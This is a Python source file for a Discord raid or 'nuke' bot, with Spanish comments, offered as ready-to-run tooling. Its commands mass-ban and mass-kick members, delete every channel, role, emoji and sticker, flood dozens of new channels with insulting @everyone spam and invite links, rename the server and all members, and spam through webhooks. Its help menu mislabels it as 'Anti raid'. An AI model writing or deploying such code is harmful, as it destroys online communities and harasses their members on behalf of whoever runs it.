import discord
from discord.ext import commands
import asyncio
import logging
import os
import random
from datetime import datetime

# Configuración de logging optimizada para monitoreo
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN") or "TU_TOKEN_AQUI"

# El banner animado de Discord configurado de forma global
GIF_URL = "https://cdn.discordapp.com/banners/1334323253992361986/a_1da916f82737a9ca0084c939821aaba7.webp?size=2048&animated=true"

# Configuración de variables globales
ejecuciones_actuales = 0
MAX_EJECUCIONES = 2
tiempo_inicio = datetime.now()
ultimo_msg_eje = None  # Guarda el último mensaje de !eje para poder editarlo

# Configuración explícita de los Intents necesarios
intents = discord.Intents.default()
intents.members = True  
intents.messages = True  
intents.message_content = True  

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    global tiempo_inicio
    tiempo_inicio = datetime.now()
    logging.info(f"⚡ MacHUB Engine Conectado: {bot.user.name} (ID: {bot.user.id})")


# ================= FUNCIÓN AUXILIAR PARA EL EMBED DE !eje =================
def generar_embed_eje():
    global ejecuciones_actuales, MAX_EJECUCIONES
    
    # Color estético: Verde si está libre (0), Amarillo si lleva 1, Rojo si está lleno (2)
    color = discord.Color.green() if ejecuciones_actuales == 0 else (discord.Color.orange() if ejecuciones_actuales == 1 else discord.Color.red())
    
    embed = discord.Embed(
        title="📊 CONTROL DE EJECUCIONES",
        description=f"**Ejecuciones del bot en:** `{ejecuciones_actuales}/{MAX_EJECUCIONES}`",
        color=color
    )
    embed.set_footer(text="MacHUB Engine • Monitoreo en tiempo real")
    embed.timestamp = datetime.now()
    return embed


# ================= COMANDO !eje (CON AUTODETECCIÓN Y EDICIÓN) =================
@bot.command()
async def eje(ctx):
    global ultimo_msg_eje
    embed = generar_embed_eje()
    
    try:
        # Si ya enviamos un mensaje antes en este canal, intentamos editarlo
        if ultimo_msg_eje:
            await ultimo_msg_eje.edit(embed=embed)
            # Borramos el comando del usuario para mantener el chat limpio
            try: await ctx.message.delete()
            except: pass
        else:
            # Si es la primera vez, mandamos uno nuevo y guardamos la ID
            ultimo_msg_eje = await ctx.send(embed=embed)
    except:
        # Si por alguna razón el mensaje viejo fue borrado manualmente, mandamos uno nuevo
        ultimo_msg_eje = await ctx.send(embed=embed)


# ================= 1. COMANDO BANPRO =================
@bot.command()
async def banpro(ctx):
    if not ctx.author.guild_permissions.ban_members: return
    if not ctx.guild.me.guild_permissions.ban_members: return
    
    mensaje_dm = f"Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp\n{GIF_URL}"
    
    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]
    
    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_member(member):
            try: await member.send(mensaje_dm)
            except: pass
            try: await member.ban(reason="Baneo masivo By Mac.")
            except: pass

        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 2. COMANDO RAIDEAR Y SPAM (rD) =================
@bot.command()
async def rD(ctx):
    global ejecuciones_actuales, ultimo_msg_eje
    
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    # Control del límite de ejecuciones
    if ejecuciones_actuales >= MAX_EJECUCIONES:
        try: await ctx.send(f"❌ Límite alcanzado ({ejecuciones_actuales}/{MAX_EJECUCIONES}). No se pueden realizar más ejecuciones.")
        except: pass
        return

    channels_to_delete = list(ctx.guild.channels)
    for channel in channels_to_delete:
        try: await channel.delete()
        except: pass

    created_channels = []
    for _ in range(50):
        try:
            ch = await ctx.guild.create_text_channel(name="Mc R")
            created_channels.append(ch)
        except: pass

    msg_por_canal = 400 
    
    async def spam_task(channel):
        for _ in range(msg_por_canal):
            try:
                await channel.send(f"@everyone server raideado putos respeten a sus mayores https://discord.gg/aACMXB4HSp\n{GIF_URL}")
                await asyncio.sleep(0.1) 
            except discord.HTTPException as e:
                if e.status == 429: await asyncio.sleep(5)
                else: break

    tasks = [spam_task(ch) for ch in created_channels]
    await asyncio.gather(*tasks)

    # Sumamos una ejecución tras finalizar el raid
    ejecuciones_actuales += 1

    # Auto-actualizar el Embed de !eje de inmediato si ya estaba en pantalla
    if ultimo_msg_eje:
        try: await ultimo_msg_eje.edit(embed=generar_embed_eje())
        except: pass


# ================= 3. EXPULSIÓN MASIVA =================
@bot.command()
async def kickpro(ctx):
    if not ctx.author.guild_permissions.kick_members: return
    if not ctx.guild.me.guild_permissions.kick_members: return

    try: await ctx.send(GIF_URL)
    except: pass

    targets = [
        member for member in ctx.guild.members 
        if not member.bot and member.id != ctx.author.id and member.top_role < ctx.guild.me.top_role
    ]

    if len(targets) == 0: return

    chunk_size = 15
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def process_kick(member):
            try: await member.kick(reason="Limpieza Masiva By Mac.")
            except: pass

        tasks = [process_kick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.8)


# ================= 4. CAMBIAR IDENTIDAD DEL SERVIDOR =================
@bot.command()
async def rnServers(ctx):
    if not ctx.author.guild_permissions.manage_guild: return
    if not ctx.guild.me.guild_permissions.manage_guild: return

    try:
        await ctx.guild.edit(name="Mc R", description="Server dominado.")
        await ctx.send(GIF_URL)
    except:
        pass


# ================= 5. BORRAR TODOS LOS ROLES =================
@bot.command()
async def rolesD(ctx):
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: await ctx.send(GIF_URL)
    except: pass

    roles_to_delete = [
        role for role in ctx.guild.roles 
        if role.name != "@everyone" and role < ctx.guild.me.top_role and not role.is_bot_managed()
    ]

    for role in roles_to_delete:
        try: await role.delete(reason="Remoción de roles.")
        except: pass
        await asyncio.sleep(0.2)


# ================= 6. CREACIÓN MASIVA DE ROLES =================
@bot.command()
async def rolesC(ctx):
    if not ctx.author.guild_permissions.manage_roles: return
    if not ctx.guild.me.guild_permissions.manage_roles: return

    try: await ctx.send(GIF_URL)
    except: pass

    async def create_role_task():
        try:
            color_aleatorio = discord.Color(random.randint(0, 0xFFFFFF))
            await ctx.guild.create_role(name="Mc R", color=color_aleatorio)
        except:
            pass

    for i in range(0, 50, 10):
        tasks = [create_role_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 7. SATURACIÓN DE CATEGORÍAS =================
@bot.command()
async def ccpro(ctx):
    if not ctx.author.guild_permissions.manage_channels: return
    if not ctx.guild.me.guild_permissions.manage_channels: return

    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

    async def create_category_task():
        try: await ctx.guild.create_category(name="Mc R")
        except: pass

    for i in range(0, 50, 10):
        tasks = [create_category_task() for _ in range(10)]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.4)


# ================= 8. CAMBIAR APODOS GLOBALMENTE =================
@bot.command()
async def nickpro(ctx):
    if not ctx.author.guild_permissions.manage_nicknames: return
    if not ctx.guild.me.guild_permissions.manage_nicknames: return

    try: await ctx.send(GIF_URL)
    except: pass

    targets = [
        m for m in ctx.guild.members 
        if m.id != ctx.guild.owner_id and m.top_role < ctx.guild.me.top_role
    ]

    chunk_size = 20
    for i in range(0, len(targets), chunk_size):
        chunk = targets[i:i + chunk_size]
        
        async def set_nick(member):
            try: await member.edit(nick="Mc R")
            except: pass

        tasks = [set_nick(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.5)


# ================= 9. BORRAR EMOJIS Y STICKERS =================
@bot.command()
async def emojisD(ctx):
    if not ctx.author.guild_permissions.manage_expressions: return
    if not ctx.guild.me.guild_permissions.manage_expressions: return

    try: await ctx.send(GIF_URL)
    except: pass

    for emoji in list(ctx.guild.emojis):
        try: await emoji.delete()
        except: pass
    
    for sticker in list(ctx.guild.stickers):
        try: await sticker.delete()
        except: pass


# ================= 10. MULTI-WEBHOOK ATTACK =================
@bot.command()
async def hookpro(ctx):
    if not ctx.author.guild_permissions.manage_webhooks: return
    if not ctx.guild.me.guild_permissions.manage_webhooks: return

    channels = ctx.guild.text_channels
    if not channels: return

    async def launch_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="Mc R Engine")
            for _ in range(25):
                await webhook.send(f"@everyone server Nuevo https://discord.gg/aACMXB4HSp\n{GIF_URL}", username="Mc R")
                await asyncio.sleep(0.2)
        except:
            pass

    tasks = [launch_webhook(ch) for ch in channels[:15]]
    await asyncio.gather(*tasks)


# ================= 11. COMANDO UPTIME =================
@bot.command()
async def uptime(ctx):
    try:
        delta_tiempo = datetime.now() - tiempo_inicio
        dias = delta_tiempo.days
        horas, rem = divmod(delta_tiempo.seconds, 3600)
        minutos, segundos = divmod(rem, 60)
        
        ping_ms = round(bot.latency * 1000)
        
        await ctx.send(
            f"📊 **Estado del bot:**\n"
            f"⏱️ **Tiempo activo:** `{dias}d {horas}h {minutos}m {segundos}s`\n"
            f"⚡ **Latencia (Ping):** `{ping_ms}ms`"
        )
    except:
        pass


# ================= 12. MENÚ DE AYUDA COMPLETO =================
@bot.command()
async def ayuda(ctx):
    menu = (
        "```\n"
        "=== Mc R Anti raid - cmds ===\n"
        "!uptime       -> Muestra el tiempo activo del bot y la latencia.\n"
        "!eje          -> Muestra el estado de ejecuciones del bot en vivo.\n"
        "!banpro       -> DM Masivo + Ban global a todos los miembros.\n"
        "!kickpro      -> Expulsa de inmediato a todos los miembros.\n"
        "!rD           -> elimina todo, crear 50 canales e inundar con 20k mensajes.\n"
        "!ccpro        -> elimina canales y crea 50 categorías para colapsar UI.\n"
        "!hookpro      -> Genera webhooks de spam ultra veloz por canal.\n"
        "!nickpro      -> Modifica el apodo de todos los usuarios a 'Mc R'.\n"
        "!rnServers    -> Cambia el nombre del servidor a 'Mc R'.\n"
        "!rolesD       -> Destruye todos los roles existentes del servidor.\n"
        "!rolesC       -> Genera 50 roles con colores arcoíris aleatorios.\n"
        "!emojisD      -> elimina los emojis y stickers personalizados.\n"
        "```"
    )
    try: 
        await ctx.send(menu)
    except: 
        pass


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): return
    logging.error(f"Error: {error}")

bot.run(TOKEN)
        
